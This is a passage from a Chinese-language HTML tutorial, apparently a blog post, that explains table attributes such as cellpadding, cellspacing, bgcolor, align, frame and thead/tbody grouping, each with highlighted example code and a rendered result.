class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>香蕉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>菠萝<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>一张图片：      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>FrontEnd_HTML_Basic/html5.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>HTML5<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1"><tbody><tr>  <td>   <p>这是一个段落。</p>   <p>这是另一个段落。</p>  </td>  <td>这个单元包含一个表格：   <table border="1">   <tbody><tr>     <td>A</td>     <td>B</td>   </tr>   <tr>     <td>C</td>     <td>D</td>   </tr>   </tbody></table>  </td></tr><tr>  <td>这个单元包含一个列表：   <ul>    <li>苹果</li>    <li>香蕉</li>    <li>菠萝</li>   </ul>  </td>  <td>一张图片：      <img src="/2020/02/14/FrontEnd_HTML_Basic/html5.jpg" alt="HTML5">  </td></tr></tbody></table><h3 id="单元格边距"><a href="#单元格边距" class="headerlink" title="单元格边距"></a>单元格边距</h3><p>Cellpadding 单元格内容与其边框之间的空白。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">cellpadding</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Second<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1" cellpadding="20"><tbody><tr>  <td>First</td>  <td>Row</td></tr>   <tr>  <td>Second</td>  <td>Row</td></tr></tbody></table><h3 id="单元格间距"><a href="#单元格间距" class="headerlink" title="单元格间距"></a>单元格间距</h3><p>cellspacing 增加单元格之间的距离。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">cellspacing</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Second<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1" cellspacing="20"><tbody><tr>  <td>First</td>  <td>Row</td></tr>   <tr>  <td>Second</td>  <td>Row</td></tr></tbody></table><h3 id="表格-单元格背景"><a href="#表格-单元格背景" class="headerlink" title="表格/单元格背景"></a>表格/单元格背景</h3><p>背景颜色<code>bgcolor</code>属性</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">bgcolor</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>yellow<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Second<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1" bgcolor="yellow"><tbody><tr>  <td>First</td>  <td>Row</td></tr>   <tr>  <td>Second</td>  <td>Row</td></tr></tbody></table><p>背景图像<code>background</code>属性</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>FrontEnd_HTML_Basic/html5.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Second<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1" background="FrontEnd_HTML_Basic/html5.jpg"><tbody><tr>  <td>First</td>  <td>Row</td></tr>   <tr>  <td>Second</td>  <td>Row</td></tr></tbody></table><p>单元格背景同理，加在相应的<code>td</code>标签里即可。例如：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">bgcolor</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>blue<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1"><tbody><tr>  <td bgcolor="blue">First</td>  <td>Row</td></tr>   </tbody></table><h3 id="排列内容"><a href="#排列内容" class="headerlink" title="排列内容"></a>排列内容</h3><p><code>align</code>属性</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>400<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>消费项目....<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>一月<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>二月<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>衣服<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$241.10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$50.20<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>食物<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$730.40<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$650.00<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>总计<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$1001.50<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$744.65<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table width="400" border="1"> <tbody><tr>  <th align="center">消费项目....</th>  <th align="center">一月</th>  <th align="center">二月</th> </tr> <tr>  <td align="left">衣服</td>  <td align="right">$241.10</td>  <td align="right">$50.20</td> </tr> <tr>  <td align="left">食物</td>  <td align="right">$730.40</td>  <td align="right">$650.00</td> </tr> <tr>  <th align="left">总计</th>  <th align="right">$1001.50</th>  <th align="right">$744.65</th> </tr></tbody></table><h3 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h3><p><code>frame</code>属性</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Table with frame="box":<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">frame</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Table with frame="above":<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">frame</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>above<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Table with frame="below":<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">frame</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>below<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Table with frame="hsides":<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">frame</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hsides<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Table with frame="vsides":<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">frame</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>vsides<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>January<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>$100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><p>Table with frame="box":</p><table frame="box">  <tbody><tr>    <th>Month</th>    <th>Savings</th>  </tr>  <tr>    <td>January</td>    <td>$100</td>  </tr></tbody></table><p>Table with frame="above":</p><table frame="above">  <tbody><tr>    <th>Month</th>    <th>Savings</th>  </tr>  <tr>    <td>January</td>    <td>$100</td>  </tr></tbody></table><p>Table with frame="below":</p><table frame="below">  <tbody><tr>    <th>Month</th>    <th>Savings</th>  </tr>  <tr>    <td>January</td>    <td>$100</td>  </tr></tbody></table><p>Table with frame="hsides":</p><table frame="hsides">  <tbody><tr>    <th>Month</th>    <th>Savings</th>  </tr>  <tr>    <td>January</td>    <td>$100</td>  </tr></tbody></table><p>Table with frame="vsides":</p><table frame="vsides">  <tbody><tr>    <th>Month</th>    <th>Savings</th>  </tr>  <tr>    <td>January</td>    <td>$100</td>  </tr></tbody></table><h3 id="行分组"><a href="#行分组" class="headerlink" title="行分组"></a>行分组</h3><p><code>thead</code> 元素应该与 <code>tbody</code> 和 <code>tfoot</code> 元素结合起来使用。（但很少使用这三个元素）</p><p><code>tbody</code> 元素用于对 HTML 表格中的主体内容进行分组，而 <code>tfoot</code> 元素用于对 HTML 表格中的表注（页脚）内容进行分组。</p><blockquote><p>thead、tfoot 以及 tbody  元素使您有能力对表格中的行进行分组。当您创建某个表格时，您也许希望拥有一个标题行，一些带有数据的行，以及位于底部的一个总计行。这种划分使浏览器有能力支持独立于表格标题和页脚的表格正文滚动。当长的表格被打印时，表格的表头和页脚可被打印在包含表格数据的每张页面上。</p></blockquote><p><code>&lt;thead&gt;</code> 内部必须拥有<code>&lt;tr&gt;</code> 标签！</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>thead</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span>green</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Month<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Savings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token 